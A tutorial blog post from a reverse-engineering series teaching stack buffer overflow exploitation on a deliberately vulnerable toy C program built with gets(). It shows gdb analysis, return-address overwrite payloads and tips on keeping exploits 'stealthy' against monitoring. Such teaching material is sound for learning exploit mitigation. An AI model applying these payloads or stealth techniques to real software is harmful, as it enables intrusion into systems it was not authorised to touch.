Hey fellow pwners!

In the previous article, we discussed the infamous Buffer Overflow Vulnerability, a few reasons why it comes into existence in a software. From an attack point of view, we were able to segfault the program. This is amazing, but can we do better? Can we design the unintentional behavior we want and make the software behave that way using the BOF? Can we write better exploits to achieve that? In this article, we will look to get answers to few of these questions.

It's post number 8. So, create a directory **post_8** inside **rev_eng_series** directory and get started!

# Introduction

1.  In the previous article, we noticed that we can get full control of **all variables** present after the buffer, the **Old Base Pointer** and **Return Address** .

2.  We took an example to see how the program segfaulting because the **Old Base Pointer** had been changed to some other value. We had extended this thought to change the **Return Address** to an address we want. Can we really do this? Yes. We can. This type of attacks are known as **Control Flow Hijacking** .

Let us take a small example to understand what Control Flow Hijacking is.

Consider a program with 2 functions - main and func. The func is a vulnerable function because it uses strcpy.

The **Normal Control Flow** would be

a. **main** calls **func**.  
b. **func**'s body gets executed normally.  
c. The Return Address of func is **main**. So, Control is returned back to main.

Suppose because of the BOF, I overwrite the Return Address with **MyAddress** . Now, the control flow would be this:

a. **main** calls **func** .  
b. **func** body gets executed normally.  
c. There is no more the Original Return Address which would give the control back to main. Instead of that, MyAddress is present. So, **Control** is passed to code at **MyAddress** .

Consider an Aeroplane travelling from A to B is hijacked. So, unfortunately it lands in an unintended place C.

This is very similar. Control was about to be transfered back from **func** to **main** in normal cases, but due to the Return Address overwrite, the Control is now transfered to code at some unintended address **MyAddress** .

I hope you are getting the analogy.

Here, the Normal Control Flow is hijacked and it takes a totally different path than the actual-intended path. This is known as **Control Flow Hijacking**.

Let us take an example and understand what Control Flow Hijacking in detail.

## Program1

Consider the following program:

    ~/rev_eng_series/post_8$ cat code1.c
    #include<stdio.h>
    #include<string.h>
    
    void exploit_func() {
            printf("In exploit_func\n");
    }
    
    
    void vuln_func() {
            char buffer[10];        
            gets(buffer);
            printf("%s\n", buffer);
    }
    
    int main() {
    
            printf("Before vuln_func: In main function\n");
            vuln_func();
            printf("After vuln_func: In main function\n");
    
            return 0;
    }
    

1.  The **main** function calls a function **vuln_func**. There are 2 printf statements one before vuln_func and one after vuln_func. The first one ensures that we are in main function before we execute vuln_func. The second one will get printed **if** control is transfered back to main function from vuln_func. If not, the printf statement after vuln_func won't be executed.

2.  The **vuln_func** is a function which initialized a buffer of size 10 bytes. It uses a function called **gets** (or getstring) to get the user input. Then the printf statement will print whatever the user entered.

3.  There is one more function named **exploit_func**. The objective is simple: We have to do something(write an exploit such that) **exploit_func** is executed. It is proven if the printf statement inside **exploit_func** is executed.

The whole objective of this example is to demonstrate Control Flow Hijacking. We will see if we can somehow jump to **exploit_func** .

Let's get started!

Compile **code1.c** in the following manner:

    ~/rev_eng_series/post_8$ gcc code1.c -o code1 -fno-stack-protector
    code1.c: In function ‘vuln_func’:
    code1.c:13:2: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
    gets(buffer);
    ^
    /tmp/ccVVL4st.o: In function `vuln_func':
    code1.c:(.text+0x26): warning: the `gets' function is dangerous and should not be used.
    adwi@adwi:~/rev_eng_series/post_8$
    

*   We have removed the security feature we spoke about in the previous post. It is easy to experiment without that.

*   Look at the compiler warning carefully. It says:
    
        warning: the `gets' function is dangerous and should not be used.
        

*   So, the compiler has already given the warning it should give. It says gets is dangerous and should not be used. We will checkout why it is dangerous and how severe it can get!

*   It was a warning, so we have an executable **code1** with us.

### Analysis - Round 1

In this round of analysis, we will just give inputs of different lengths and see at what **shortest length** it segfaults.

1.  Input Length = 10 bytes.
    
        ~/rev_eng_series/post_8$ ./code1
        Before vuln_func: In main function
        aaaaaaaaaa
        aaaaaaaaaa
        After vuln_func: In main function
        adwi@adwi:~/rev_eng_series/post_8$
        

2.  Input Length = 16 bytes.
    
        ~/rev_eng_series/post_8$ ./code1
        Before vuln_func: In main function
        aaaaaaaaaaaaaaaa
        aaaaaaaaaaaaaaaa
        After vuln_func: In main function
        adwi@adwi:~/rev_eng_series/post_8$
        

3.  Typing the input everytime is a boring job. Here the input length is in terms of 10s of bytes so we can type it in. If the buffer is 100 bytes, then that is a problem. For this, we will use **python** to enter the input.
    
        ~/rev_eng_series/post_8$ python -c "print 'a' * 17" | ./code1
        Before vuln_func: In main function
        aaaaaaaaaaaaaaaaa
        After vuln_func: In main function
        adwi@adwi:~/rev_eng_series/post_8$
        
    
    *   The **-c** flag stands for **commandline** . The command **print 'a' * 17** is executed. This will give **aaaaaaaaaaaaaaaaa** as output. This output is given as an input for **code1** which is what we want. The **|** is known as a **pipe**. You are piping python's output into code1.
    
    *   From this point, we will use this **python -c** option to get the input.
    
    *   Ok. 17 bytes - nothing happened.

4.  Input length = 23 bytes
    
        ~/rev_eng_series/post_8$ python -c "print 'a' * 23" | ./code1
        Before vuln_func: In main function
        aaaaaaaaaaaaaaaaaaaaaaa
        After vuln_func: In main function
        

5.  Input Length = 24 bytes
    
        adwi@adwi:~/rev_eng_series/post_8$ python -c "print 'a' * 24" | ./code1
        Before vuln_func: In main function
        aaaaaaaaaaaaaaaaaaaaaaaa
        Illegal instruction (core dumped)
        adwi@adwi:~/rev_eng_series/post_8$
        

So, for **24 bytes** of input, the program crashed.

Note that this is not a very easy method to find the Input Length. It's trial and error method with a bit of hint that Input Length > 10 bytes.

We will look into finding the Input Length in one shot now - and at the same time find why it is segfaulting.

### Analysis - Round 2

Let us fire up our debugger and run **code1**.

1.  Let us look at the disassembly of **main** function:
    
        ~/rev_eng_series/post_8$ gdb -q code1
        Reading symbols from code1...(no debugging symbols found)...done.
        gdb-peda$ disass main
        Dump of assembler code for function main:
        0x000000000040059f <+0>:     push   rbp
        0x00000000004005a0 <+1>:     mov    rbp,rsp
        0x00000000004005a3 <+4>:     mov    edi,0x400668
        0x00000000004005a8 <+9>:     call   0x400430 <puts@plt>
        0x00000000004005ad <+14>:    mov    eax,0x0
        0x00000000004005b2 <+19>:    call   0x400577 <vuln_func>
        0x00000000004005b7 <+24>:    mov    edi,0x400690
        0x00000000004005bc <+29>:    call   0x400430 <puts@plt>
        0x00000000004005c1 <+34>:    mov    eax,0x0
        0x00000000004005c6 <+39>:    pop    rbp
        0x00000000004005c7 <+40>:    ret
        End of assembler dump.
        gdb-peda$
        
    
    *   Everything is as expected. 2 puts functions one before and one after **vuln_func** . 

2.  We will look at **vuln_func** :
    
        gdb-peda$ disass vuln_func
        Dump of assembler code for function vuln_func:
        0x0000000000400577 <+0>:     push   rbp
        0x0000000000400578 <+1>:     mov    rbp,rsp
        0x000000000040057b <+4>:     sub    rsp,0x10
        0x000000000040057f <+8>:     lea    rax,[rbp-0x10]
        0x0000000000400583 <+12>:    mov    rdi,rax
        0x0000000000400586 <+15>:    mov    eax,0x0
        0x000000000040058b <+20>:    call   0x400450 <gets@plt>
        0x0000000000400590 <+25>:    lea    rax,[rbp-0x10]
        0x0000000000400594 <+29>:    mov    rdi,rax
        0x0000000000400597 <+32>:    call   0x400430 <puts@plt>
        0x000000000040059c <+37>:    nop
        0x000000000040059d <+38>:    leave
        0x000000000040059e <+39>:    ret
        End of assembler dump.
        gdb-peda$
        
    
    *   A StackFrame of **16 bytes** is given for **vuln_func** . 
    *   Then **gets** is called. 
    *   Then **puts** is called. 

3.  Let us run **code1** directly with an input of length = 24 bytes. Let at break at **vuln_func** because that is the function under scrutiny.
    
        gdb-peda$ b vuln_func
        Breakpoint 1 at 0x40057b
        gdb-peda$ python print ('a' * 24)
        aaaaaaaaaaaaaaaaaaaaaaaa
        gdb-peda$ run
        

*   Copy those 24 bytes. Later you will have to input it when the program asks for it.

*   The strange thing is, **0x400500** is apparently not an invalid memory location. In the **stack** layout provided by gdb, it says **< register_tm_clones >**. The point to note is it is some valid memory location in the process's memory layout.

*   Now, the conclusion is that the control should not go back to main, but to some code at address = **0x400500** . Let us continue and see what happens.

*   Observe keenly. The program has crashed. The reason is **SIGILL** . This is a signal given to the process by the operating system when the program tries to execute an **Illegal Instruction**. Remember that we had got the same message (**Illegal Instruction(core dumped))** during first round of analysis.

*   Also note that the program did not go back to **main** function.

*   Let us analyse what has happened.
    
    *   There was a new Return Address instead of the actual proper Return Address. 
    *   The program's control was transfered to the code at the New Return Address without any problems. 
    *   So, Control was **not** transfered back to main. 

*   Note that **rbp** is not being used here. So, the program did not segfault because of that. Most of the times, the program first segfaults because the **rbp** is changed.

### Analysis - Round 3

To confirm this, we will run the program one more time in gdb using the following input:

        python -c 'a' * 16 + 'b' * 8 + 'c' * 8
    

*   The first 16 bytes of **'a'** should fill the buffer. The next 8 bytes of **'b'** should cover the **Old Rbp**. 
*   **IMPORTANT**: The next 8 bytes of **'c'** should cover the **Return Address** .

*   In this round, we will start observing from just before **gets** is executed.

*   Just before **gets** is executed, this is the state:

    *   The instruction which was executed was **ret** instruction. Look at the **top** of the stack. It should ideally have the Original Return Address(**0x4005b7**) but it has **cccccccc** which is what we wanted.
    
    *   The program is trying to jump to the address **0x6363636363636363** which is an **Invalid Address** . When a program is trying to access an Invalid Address, it **Segfaults**. To see what Addresses are valid and what Addresses are invalid, look into **/proc/PID/maps** file.

### Conclusions from analysis:

1.  We were successfully able to overwrite the Actual Return Address by the Address we want(**cccccccc**).

2.  So, this proves that we hijacked the control of the program - Congratulations!!.

3.  There are a lot of things to learn from the 3 rounds of analysis we did:

a. In the first round, giving an input was a problem. We used **python -c** to get the job done. Remember this technique because you will be using a lot of this.

b. In the second round, we analysed the stack carefully and were able to come up with an input to hijack the control of the program.

c. We executed that Input to hijack the program. In any exploit you write, it is always best to look into the program using the debugger, make all the calculations properly and then design the input.

1.  Most importantly, let us stop calling the stuff we enter into the program as Input. It is no longer normal input. It is **Payload** / **Exploit Payload**. From now on, we design **Exploit Payloads** and not mere Inputs :P

### End Goal?

Was this the end goal? Nope. Our end goal was nicer, more evil :P . We want to execute **exploit_func** .

In the previous round of Analysis, we were able to control the flow of the program. We wanted the control to jump to **0x6363636363636363** and it jumped. So, we know that we have full control over the flow of the program. It can jump to whatever Address we want it to jump.

Where do we want it to jump? **exploit_func** !!!

So, instead of giving some meaningless address like 0x6363636363636363, we will input the address of **exploit_func** .

### Exploiting it!!

How do we find the address of **exploit_func** ? There are several different ways. You can use readelf, objdump, etc., As my **gdb** commandline is still running, I will look the disassembly of **exploit_func** and get it's Address.

        gdb-peda$ disass exploit_func
        Dump of assembler code for function exploit_func:
        0x0000000000400566 <+0>:     push   rbp
        0x0000000000400567 <+1>:     mov    rbp,rsp
        0x000000000040056a <+4>:     mov    edi,0x400658
        0x000000000040056f <+9>:     call   0x400430 <puts@plt>
        0x0000000000400574 <+14>:    nop
        0x0000000000400575 <+15>:    pop    rbp
        0x0000000000400576 <+16>:    ret
        End of assembler dump.
        gdb-peda$
    

*   The Address of **exploit_func** = **0x0000000000400566** .

*   Now, we will contruct the **Exploit Payload** which when input, **exploit_func** is executed. This is important. Please give complete attention while reading this part.

a. The stack of **vuln_func** looks like this:

        <buffer: 16-bytes><Old Rbp: 8-bytes><Return Address: 8-bytes>
    

b. So, the payload should look something like this:

        'a' * 16 + 'b' * 8 + Address_of_exploit_func
    

*   Note that instead of 'b', you can use 'a' also. These 'a', 'b' are just characters which we are using and will have no effect in this exploit. The only thing which is important is Return Address.

*   The reason it's better to give different letters for different parts of the stack is that it will be easy to debug if the exploit fails for some reason.

c. **Construction of Exploit Payload:**

*   These are the things you have to do:
    
    *   Get the Target Address. In this example, our Target Address is Address of **exploit_func** which is **0x0000000000400566**.
    
    *   Do all the calculations properly - Done!
    
    *   Writing the payload:
        
            python -c "print 'a' * 16 + 'b' * 8 + '\x66\x05\x40\x00\x00\x00\x00\x00'"
            

*   There are a few things to make note of:
    
    *   Our Target Address is 0x00-0x00-0x00-0x00-0x00-0x40-0x05-0x66. But in the payload, the bytes are in the reverse order. Why do you think it is? Yes. It is because of the Little-Endianess of Intel systems.
    
    *   In case we give the payload like this: '\x00\x00\x00\x00\x00\x40\x05\x66', then in the memory, it would be stored in the Big-Endian way which the Intel System won't understand.So, what we do is, we input it in the reverse order(Little-endian Order) so that the address is stored in the correct order in memory.
    
    *   **\xPQ** is a way to represent an 8-bit number(unsigned char). Refering to this ascii table:

    *   1 byte is 8-bits. So, 1-byte can represent numbers from 0 to 255. In this 0-255 range,
        
        *   SubRange1: 0x00 - 0x1F : Can be generated with the help fo keyboard. 
        *   SubRange2: 0x20 - 0x7E : Can be generated easily with the keyboard. 
        *   SubRange3: 0x7F - 0xFF : No way to generate it. 
    
    *   So, we will have to use the **\xPQ** notation for SubRange1 and SubRange3. Because the payload should be neat and will make more sense when hexadecimal numbers are used, we will use **\xPQ** notation for SubRange2 also.
    
    *   Take this example: In the Target Address, we have a byte with value **0x40** whose ascii character is **@**. For us, **0x40** makes more sense than **@** here because we really don't care about what ascii character that number represents. Our focus is only on the number 0x40.

*   Coming back to Exploit Payload, this is what we have:
    
        python -c "print 'a' * 16 + 'b' * 8 + '\x66\x05\x40\x00\x00\x00\x00\x00'"
        

*   Let us compare it with the stack layout of **vuln_func** :
    
        <buffer: 16-bytes><Old Rbp: 8-bytes><Return Address: 8-bytes>
        

*   Comparing the payload and the stack layout, our Exploit should work perfectly.

*   The time has come. Let us execute **code1** with this Exploit Payload:
    
        ~/rev_eng_series/post_8$ python -c "print 'a' * 16 + 'b' * 8 + '\x66\x05\x40\x00\x00\x00\x00\x00'" | ./code1
        Before vuln_func: In main function
        aaaaaaaaaaaaaaaabbbbbbbbf@
        In exploit_func
        Illegal instruction (core dumped)
        ~/rev_eng_series/post_8$
        

*   Woohooo!! Successs! Look at this!

*   The printf statement of **exploit_func** is executed which means **exploit_func** is successfully executed.

*   Congratulations on your first well-crafted exploit. Go through the this section again and make sure you understand how we crafted the exploit.

### Can we do better?

*   This is always the question we ask whatever we do. Can we do better. Let us see what are the things we can improve on:
    
    *   Good part is **exploit_func** got executed. But then, the program **segfaulted**. Suppose this was a web-server. It will be monitored continuously. So, as soon as the web-server segfaults, people will become alert that some shit has happened and they will start investigating.
    
    *   So, even though the **exploit_func** was executed, they might see why it crashed and probably patch it up. As an attacker, you would never want that to happen :P . So, can we do something to make sure the program doesn't segfault?

*   We just discussed about how to make an exploit **stealthier** . It means, to craft the exploit payload such that no one notices it and everything happens peacefully.

### Analysis: Round 4

1.  Let us put the Exploit Payload into a file **exploit.txt** and then execute the program using gdb to see if we can do something.
    
        python -c "print 'a' * 16 + 'b' * 8 + '\x66\x05\x40\x00\x00\x00\x00\x00'" > exploit.txt
        

2.  Running **code1** with gdb:

*   The goal is very clear. We will observe the execution of **exploit_func**. We will break at **gets** of **vuln_func** and we will break at **exploit_func** .
    
        ~/rev_eng_series/post_8$ gdb -q code1

*   The **ret** is about to get executed. Look at the top of the stack. It has some address **0x400500** to which the control jumps. Let us go a bit back and see how the stack looked just after **gets** of **vuln_func** was executed.
    
        <buffer: 'a' * 16><Old Rbp: 'b' * 8><Target Address><Some number: 0x400500>
        

*   Notice this. We had full control over the Return Address of **vuln_func**. So, it was overwritten with our Target Address. The **8-bytes** after that is this number **0x400500** which is turning out to be the Return Address of our **exploit_func**. This is a problem because we know that the program crashes if code at **0x400500** is executed.

*   So, do we have control over what the Return Address of **exploit_func** is? Absolutely.

*   The **<some number: 0x400500></some>** should be overwritten by the Address we want. That is easy. It will just add 8 more bytes into our exploit payload. **Right now**, our Exploit Payload is this:
    
        'a' * 16 + 'b' * 8 + '\x66\x05\x40\x00\x00\x00\x00\x00'
        

*   This is changed to this:
    
        'a' * 16 + 'b' * 8 + '\x66\x05\x40\x00\x00\x00\x00\x00' + <Some Return Address for exploit_func>
        

*   What would the ideal Return Address for exploit_func be such that our program doesn't crash? How is this idea: Can we go back to the main function? As in, can the Return Address of **exploit_func** be the Original Return Address of **vuln_func** - which is actually an instruction in main function.

*   Let's find out the Return Address of **vuln_func** . For that, let us look at disassembly of **main** :

        0x00000000004005b7 <+24>:    mov    edi,0x400690
        0x00000000004005bc <+29>:    call   0x400430 <puts@plt>
        0x00000000004005c1 <+34>:    mov    eax,0x0
        0x00000000004005c6 <+39>:    pop    rbp
        0x00000000004005c7 <+40>:    ret
        End of assembler dump.
        gdb-peda$
        

*   The Actual Return Address of **vuln_func** should be **0x00000000004005b7 <+24>: mov edi,0x400690**. So, Original Return Address of **vuln_func** = 0x00000000004005b7.

*   Now that we have figured out how to make it more stealthier, let us write the exploit payload for this.
    
        python -c "print 'a' * 16 + 'b' * 8 + '\x66\x05\x40\x00\x00\x00\x00\x00' + '\xb7\x05\x40\x00\x00\x00\x00\x00'"
        

*   Always take care of Endianness while crafting exploit payloads. Simple mistake and the whole exploit might be of no use.

*   Let us come out of gdb and run the program with this exploit payload:
    
        ~/rev_eng_series/post_8$ python -c "print 'a' * 16 + 'b' * 8 + '\x66\x05\x40\x00\x00\x00\x00\x00' + '\xb7\x05\x40\x00\x00\x00\x00\x00'" | ./code1
        Before vuln_func: In main function
        aaaaaaaaaaaaaaaabbbbbbbbf@
        In exploit_func
        After vuln_func: In main function
        Segmentation fault (core dumped)
        adwi@adwi:~/rev_eng_series/post_8$
        

*   Woohoo!! Look at the output: **After vuln_func: In main function** . This means, the control was successfully transfered back to the main function.

*   This is a good progress, but we also were looking forward for the program not to crash. So, was there something we did not take care of?

### Another step towards being stealth!

1.  Look at our payload:
    
        python -c "print 'a' * 16 + 'b' * 8 + '\x66\x05\x40\x00\x00\x00\x00\x00' + '\xb7\x05\x40\x00\x00\x00\x00\x00'"
        

*   The **bbbbbbbb** job is to overwrite the **Old Rbp** value of **vuln_func**. The Old Rbp value of **vuln_func** is the Actual **rbp** value of our **main** function.

*   So, after the control is transfered to main, the **main** thinks that **bbbbbbbb** is it's **rbp** value. But that is obviously not the case. So, instead of **bbbbbbbb** if we put the actual rbp value of main, will we reach the goal of stealth? Let us see!

1.  For one last time, let us run the program using **gdb** and break at main:
    
        ~/rev_eng_series/post_8$ gdb -q code1
        Reading symbols from code1...(no debugging symbols found)...done.
        gdb-peda$ b main
        Breakpoint 1 at 0x4005a3
        gdb-peda$ run
        

*   This is the state:

            gdb-peda$
        

*   At this point, the StackFrame is just constructed. Let us look at the **rbp** register and get **main** function's rbp value. It is **0x7fffffffd8d0**. So, this is done. Let us exit from gdb and craft the right payload.

1.  Old Payload: (For reference)
    
        python -c "print 'a' * 16 + 'b' * 8 + '\x66\x05\x40\x00\x00\x00\x00\x00' + '\xb7\x05\x40\x00\x00\x00\x00\x00'"
        

2.  New Payload:

*   Instead of **bbbbbbbb** , we want to put the value **0x7fffffffd8d0**.

*   Look at this:
    
        python -c "print 'a' * 16 + '\xd0\xd8\xff\xff\xff\x7f\x00\x00' + '\x66\x05\x40\x00\x00\x00\x00\x00' + '\xb7\x05\x40\x00\x00\x00\x00\x00'"
        

*   Again, keep in mind the endian-ness.

1.  Execute with new payload:
    
        ~/rev_eng_series/post_8$ python -c "print 'a' * 16 + '\xd0\xd8\xff\xff\xff\x7f\x00\x00' + '\x66\x05\x40\x00\x00\x00\x00\x00' + '\xb7\x05\x40\x00\x00\x00\x00\x00'" | ./code1Before vuln_func: In main function
        aaaaaaaaaaaaaaaa�����
        In exploit_func
        After vuln_func: In main function
        Segmentation fault (core dumped)
        adwi@adwi:~/rev_eng_series/post_8$
        

*   Oh Damn! This was not expected.

*   So, again. Are we not taking care of everything?

### Are we taking are of everything?

1.  Let us write a small program to confirm this:
    
        ~/rev_eng_series/post_8$ cat code2.c
        #include<stdio.h>
        int main() {
        
                int a = 10;
                printf("Address of a = %p\n", &a);
                return 0;
        }
        ~/rev_eng_series/post_8$ gcc code2.c -o code2
        

*   It is a simple program. It initializes a variable **a** and prints it's address. 

1.  Let us execute it:
    
        ~/rev_eng_series/post_8$ ./code2
        Address of a = 0x7ffc61bda0f4
        ~/rev_eng_series/post_8$
        

*   Note the Address of **a** . 

1.  Let us execute it one more time:
    
        ~/rev_eng_series/post_8$ ./code2
        Address of a = 0x7ffe3f32fa74
        ~/rev_eng_series/post_8$
        

*   See, the **Address** of **a** has changed. Why is that?

*   Any local variable at the assembly level is accessed with the help of **rbp**. You might have observed. Like this:
    
        dword [rbp-0x10]
        
        or 
        
        dword[rbp-0x20]
        
        or something similar. 
        

*   So, even **a** will be accessed in the same way. You can look at the disassembly and confirm this.

*   So, Address of **a** is changing everytime we run. Does this mean **Value of rbp** also changes everytime? Absolutely.

*   Actually it is the other way round. Because **Value of rbp** changes, Address of **a** is different.

*   So, this is what we were **not** taking care of in the exploit payload. We had set our **rbp** value to **0x7fffffffd8d0**. But, we can see that this doesn't work. It is changing everytime.

1.  What is this "effect"? Why is this happening? Is this something intended?

*   Yes. This is an intended effect. We have fallen for another classic **Security Feature**. It randomizes addresses so that we cannot predict it. So, writing exploits is harder now. Let us not discuss this security feature here. We will take it up in a different post and dig deeper. 

1.  If you run the program with a debugger, you might not see this effect. The Operating System relaxes a little bit when in debugging mode. But this actually mislead us here - So, be careful!

Don't be disheartened. We made a lot of progress today. Started with simply segfaulting to Hijacking Control Flow to execute **exploit_func** and later made it a bit more **stealth** by returning back to **main** function.

## Summary:

1.  We did a lot of stuff today. Started with simple length-based exploit payloads which just produced SegFaults to beautiful exploit payloads which got some real work done in terms of evilness :P

2.  We saw one more **flawed**, **Problematic** function - **gets**. This doesn't do length checking. We will look at many more functions in coming articles. For details about any of these functions, read their manpages.

3.  Let us summarize everything we have done till here:

a. Saw how to hijack control flow and execute what we want - **exploit_func** and then back to **main**.

b. We learned 2 ways of inputting Exploit payload into the program. We used **python -c** most of the times. We also stored the Payload in a file **exploit.txt** and then took input from it.

*   Sometimes, you will craft the Payload properly. Inputting will become a very big problem. This requires a bit of practice and playing around with terminal skills. 

c. We also encountered another **Security feature** that randomized addresses. We will look at all security features in a separate single post.

d. Understood what **Stealth** is and how important it is.

1.  This is what we did today: 

**b.** Normal Control Flow:

        main -----------> vuln_func 
          |                  |
          --------<----------- 
    

**a.** Just SegFault:

        main -----------> vuln_func -----------> SegFault
    

**b.** Hijacking the Control Flow to execute **exploit_func** :

        main -----------> vuln_func ------------> exploit_func ----------> SegFault
    

**c.** Coming back to main function:

        main ------------> vuln_func ------------> exploit_func 
         | |                                             |
         |  --------------<-----------<------------------
         |
         ----------> SegFault
    

*   I hope with these diagrams, you are making more sense of what we did in this article. 

## Where do we go from here?

1.  We saw **Control Flow Hijacking** in good detail.

2.  There is one problem in what we did today. In reality, **NO** software(Eg: Web-Server) will obviously have functions like **exploit_func** . No honest developer would do that. This was an example taken to thoroughly understand Control Flow Hijacking. Does this mean, this is the end of Control Flow Hijacking? A big NO!.

3.  In the next article, we will look at one of the best methods to exploit a BOF and here, you can actually design the unintended behavior you want and write proper exploit to get it. It is know as **Code Injection** Exploit Method. This ruled or probably ruling the way exploits are written. This is a realistic method, which can be tried out on real systems. This is what we will be doing in the next article.

4.  We have encountered 2 Security Features so far. We will encounter one more next article. We will discuss everything about these Security Features in a separate post. The thought is this:

**Vulnerabilities** ------> **Different Exploit Methods** -------> **Security features to mitigate those exploits** .

*   We are still exploring our first Security Vulnerability - Buffer OverFlow Vulnerability. With Vulnerability = BOF, we are in the second stage. We are exploring different methods to exploit it. After we discuss famous exploit methods, we will jump to third stage.

*   A vulnerable system is present. An attacker exploits it. Everyone will come to know and they will administer a security feature which will mitigate / not allow all such exploits. Then attackers will try to **Bypass** that security feature by finding a **new exploit method**. The cycle goes on.

*   We have chosen BOF. So, we will look at this cycle with respect to BOF. At the end of it, you will understand how legendary a vulnerability BOF is!

## Conclusion

1.  Note for people using 32-bit systems: The concept is all the same. The lengths of exploits might be different. You will have to calculate it properly using gdb. The Addresses also will be different. You have to take care of the addresses. One important difference is arguments to a function. In 64-bit, registers are used for first 6 arguments but in 32-bit, it is all in the stack. So, if I have refered to any register here, look into the corresponding stack address in 32-bit. This is the reason why we discussed Function Calling Mechanisms in both 32-bit and 64-bit systems.

2.  The best way to understand all this and get a hang of this is to write your own programs using different vulnerable functions, write your own exploits and test it and have fun!

3.  This turned out to be one more long article. The point was to keep the whole Control Flow Hijacking example in 1 place. And it is a good thing to take one thing and explore it till you get some satisfaction :)

That is it for this article. I learned a lot writing this article. Hope you had fun and learned something out of this.

Thank you!
